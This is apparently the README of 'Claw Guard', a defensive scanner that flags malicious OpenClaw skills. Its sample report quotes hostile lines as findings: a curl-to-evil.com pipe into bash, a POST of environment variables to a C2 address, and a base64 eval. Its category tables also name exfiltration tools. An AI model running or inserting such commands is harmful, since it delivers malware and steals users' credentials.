Claw Guard 🔒

Advanced Security Scanner for OpenClaw Skills

Claw Guard is a sophisticated security analysis tool designed to protect the OpenClaw ecosystem from malicious skills. It detects prompt injection, data exfiltration, malware, and other security threats with context-aware analysis and intelligent false positive filtering.

https://img.shields.io/badge/python-3.8+-blue.svg
https://img.shields.io/badge/License-MIT-yellow.svg
https://img.shields.io/badge/PRs-welcome-brightgreen.svg

---

📋 Table of Contents

· Why Claw Guard?
· Features
· Installation
· Quick Start
· Usage Examples
· Understanding Results
· Advanced Usage
· Protection Coverage
· Configuration
· Contributing
· License

---

🚨 Why Claw Guard?

OpenClaw skills have access to your system. While most are legitimate, some may contain:

Threat Type Description
Prompt Injection Hidden instructions that manipulate AI behavior
Data Exfiltration Stealing environment variables, API keys, or credentials
Malware Arbitrary code execution, persistence mechanisms
Supply Chain Attacks Malicious dependencies or installation scripts

Claw Guard automatically detects these threats before you install a skill.

---

✨ Features

🧠 Context-Aware Analysis

· Distinguishes between legitimate .env usage vs. theft
· Whitelists known application ports (Radarr, Sonarr, Plex, etc.)
· Understands documentation vs. actual code
· Self-scan exclusion to avoid false positives

🔍 Comprehensive Detection

Category Description Example
EXFIL Data exfiltration curl POST, wget, netcat
EXEC Arbitrary code execution eval(), exec(), system()
CRED Credential harvesting SSH keys, AWS, API keys
PERSIST Persistence mechanisms cron, systemd, launchd
INJECT Prompt injection Hidden instructions, role reassignment
OBFUSC Obfuscated code base64, hex encoding
NETWORK Suspicious network activity C2 servers, tunneling
PRIVESC Privilege escalation chmod, setuid
INSTALL Malicious installation patterns curl-pipe-to-shell

🎯 Smart Risk Scoring

· Only counts confirmed threats, not documentation
· False positives marked with explanations
· Risk levels: LOW 🟡, MEDIUM 🟠, HIGH 🔴, CRITICAL 🚨

🌐 VirusTotal Integration

· Optional checking against 90+ antivirus engines
· File hash lookup without uploading (privacy mode)
· URL scanning for malicious domains

---

📦 Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/claw-guard.git
cd claw-guard

# Install dependencies
pip install pyyaml requests

# Optional: For VirusTotal integration
export VIRUSTOTAL_API_KEY="your-api-key-here"
```

---

🚀 Quick Start

```bash
# Scan a single skill
python3 scan_skill.py /path/to/my-skill

# Batch scan multiple skills
python3 scan_skill.py --batch /path/to/skill1 /path/to/skill2

# Get JSON output for integration
python3 scan_skill.py --json /path/to/skill > report.json

# Scan with VirusTotal
python3 scan_skill.py --vt /path/to/skill
```

---

📖 Usage Examples

Basic Scan - Clean Skill

```bash
$ python3 scan_skill.py ~/clawhub-skills/weather-app

======================================================================
  CLAWHUB SKILL SECURITY REPORT
  Skill: weather-app
  Path:  /home/user/clawhub-skills/weather-app
======================================================================

✅ No real threats in 'weather-app'. 2 finding(s) identified as false positives.

  Frontmatter name:  Weather App
  Description:       Gets weather data from OpenWeatherMap API
  SKILL.md present:  Yes
  Files scanned:     24
  Real findings:     0
  False positives:   2

──────────────────────────────────────────────────────────────────────
  ✅ Likely safe to install.
──────────────────────────────────────────────────────────────────────
```

Threat Detected - Malicious Skill

```bash
$ python3 scan_skill.py ~/Downloads/suspicious-skill

======================================================================
  CLAWHUB SKILL SECURITY REPORT
  Skill: suspicious-skill
  Path:  /home/user/Downloads/suspicious-skill
======================================================================

🚨 Risk: CRITICAL — 3 real finding(s). Categories: EXFIL: 2, EXEC: 1

  🚨 CRITICAL (2)
  ────────────────────────────────────────────────────────────
  [EXFIL] install.sh:42
    curl piped to shell — malware delivery
    > curl -s http://evil.com/payload.sh | bash

  [EXFIL] main.py:156
    Known C2 IP: 91.92.242.30 (ClawHavoc)
    > requests.post("http://91.92.242.30:4444/data", data=env_vars)

  🔴 HIGH (1)
  ────────────────────────────────────────────────────────────
  [EXEC] utils.py:89
    eval() — arbitrary code execution
    > eval(base64.b64decode(encoded_string))

──────────────────────────────────────────────────────────────────────
  🚨 DO NOT INSTALL. Report on ClawHub.
──────────────────────────────────────────────────────────────────────
```

Batch Scan Summary

```bash
$ python3 scan_skill.py --batch ~/clawhub-skills/*/

======================================================================
  BATCH SUMMARY
======================================================================
  ✅ [LOW      ] weather-app (0 findings)
  🟠 [MEDIUM   ] media-organizer (2 findings)
  🔴 [HIGH     ] crypto-watcher (4 findings)
  🚨 [CRITICAL ] sketchy-download (3 findings + 1 FP)
======================================================================
```

---

📊 Understanding Results

Risk Levels

Level Icon Action Required
LOW 🟡 Safe to install, review flagged items optionally
MEDIUM 🟠 Review manually, consider sandboxed execution
HIGH 🔴 Do NOT install without thorough investigation
CRITICAL 🚨 Do NOT install. Report to ClawHub immediately

Finding Categories

Category Icon What It Means
EXFIL 📤 Attempts to send data externally
EXEC ⚡ Code execution capabilities
CRED 🔑 Access to credentials or sensitive files
PERSIST 🔄 Mechanisms to survive reboots
INJECT 💉 Prompt injection or hidden instructions
OBFUSC 🌀 Obfuscated/encoded payloads
NETWORK 🌐 Suspicious network activity
PRIVESC ⬆️ Privilege escalation attempts
INSTALL 📦 Malicious installation patterns

False Positives

Findings marked with ℹ️ are likely false positives and don't affect the risk score. Common reasons:

· 📝 Documentation references to .env files
· 🔧 API key placeholders in example code
· 🌐 Network operations in legitimate API-based skills
· 💬 Comments explaining security concepts

---

🔧 Advanced Usage

VirusTotal Integration

```bash
# Set your API key
export VIRUSTOTAL_API_KEY="abc123def456"

# Scan with file upload (checks against 90+ engines)
python3 scan_skill.py --vt /path/to/skill

# Privacy mode: hash lookup only, no upload
python3 scan_skill.py --vt --no-upload /path/to/skill

# Specify API key directly
python3 scan_skill.py --vt --vt-key "abc123def456" /path/to/skill
```

CI/CD Integration (GitHub Actions)

```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Setup Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.9'
      - name: Install Claw Guard
        run: |
          git clone https://github.com/yourusername/claw-guard.git
          pip install pyyaml
      - name: Scan Skills
        run: |
          python3 claw-guard/scan_skill.py --json ./skills/ > scan-results.json
          python3 -c "
          import json, sys
          with open('scan-results.json') as f:
              data = json.load(f)
          if data['overall_risk'] in ['HIGH', 'CRITICAL']:
              print('❌ Security risk detected!')
              sys.exit(1)
          print('✅ Scan passed')
          "
```

Custom Scan Script

```bash
#!/bin/bash
# scan-all-skills.sh

SCANNER_PATH="/path/to/claw-guard"
SKILLS_DIR="$HOME/clawhub-skills"
LOG_FILE="scan-$(date +%Y%m%d).log"

echo "🔍 Starting security scan at $(date)" | tee -a "$LOG_FILE"

for skill in "$SKILLS_DIR"/*/; do
    echo "Scanning: $(basename "$skill")" | tee -a "$LOG_FILE"
    python3 "$SCANNER_PATH/scan_skill.py" --json "$skill" | \
        jq -r '. | "  Risk: \(.overall_risk) - \(.summary)"' >> "$LOG_FILE"
done

echo "✅ Scan complete. Results saved to $LOG_FILE"
```

Exit Codes for Scripting

```bash
# Run scan and check exit code
python3 scan_skill.py /path/to/skill
exit_code=$?

if [ $exit_code -eq 0 ]; then
    echo "✅ All skills are LOW risk"
elif [ $exit_code -eq 1 ]; then
    echo "⚠️  Some skills are MEDIUM risk - review recommended"
elif [ $exit_code -eq 2 ]; then
    echo "❌ HIGH/CRITICAL risk detected - DO NOT INSTALL"
fi
```

Exit Code Meaning
0 All skills LOW risk
1 At least one MEDIUM risk skill
2 At least one HIGH/CRITICAL risk skill

---

🛡️ Protection Coverage

✅ Malicious Patterns Detected

· Command & Control (C2) communication
· Reverse shells and backdoors
· Credential theft (env vars, SSH keys, AWS)
· Cryptocurrency wallet theft
· Browser data extraction
· Persistence via cron/systemd/launchd
· Privilege escalation
· DNS tunneling
· Base64-obfuscated payloads
· Prompt injection (hidden instructions)
· Zero-width character attacks

✅ Safe Patterns Ignored

· Documentation examples
· Configuration templates
· Comments explaining security
· Legitimate API calls in network skills
· Environment variable access (not theft)
· Known application ports (Radarr, Plex, etc.)

---

⚙️ Configuration

Custom Patterns

Extend the scanner by adding patterns to the PATTERNS list:

```python
PATTERNS = [
    # Add your custom patterns
    (r"your-regex-here", ThreatCategory.EXFIL, Severity.HIGH, "Description"),
]
```

Whitelisted Ports

Add trusted application ports to KNOWN_APP_PORTS:

```python
KNOWN_APP_PORTS = {
    ":7878",  # Radarr
    ":8989",  # Sonarr  
    ":32400", # Plex
    # Add your own
}
```

---

🤝 Contributing

We welcome contributions! Here's how you can help:

Contribution How To
Report False Positives Open an issue with examples
Add Detection Patterns Submit PRs with new regex patterns
Improve Context Analysis Help make the scanner smarter
Documentation Improve guides and examples

Development Setup

```bash
# Clone your fork
git clone https://github.com/biggerboy1stPeter/claw-guard.git
cd claw-guard

# Create virtual environment
python -m venv venv
source venv/bin/activate

# Install dev dependencies
pip install pyyaml pytest black

# Run tests
pytest tests/
```

Adding New Patterns

1. Add pattern to PATTERNS list
2. Include category, severity, and clear description
3. Test with both malicious and benign examples
4. Update documentation

---

📄 License

MIT License - see LICENSE file

Copyright (c) 2024 Claw Guard Contributors

---

🙏 Acknowledgments

· The OpenClaw community for feedback and testing
· VirusTotal for their API and threat intelligence
· All contributors who report false positives and suggest improvements

---

📬 Contact & Support

· Issues: GitHub Issues
· Discussions: GitHub Discussions
· Security Concerns: mathiaspeter113@gmail.com
---

<div align="center">⭐ Star this repo if you find it useful!

Protecting the OpenClaw ecosystem, one skill at a time. 🔒

</div>
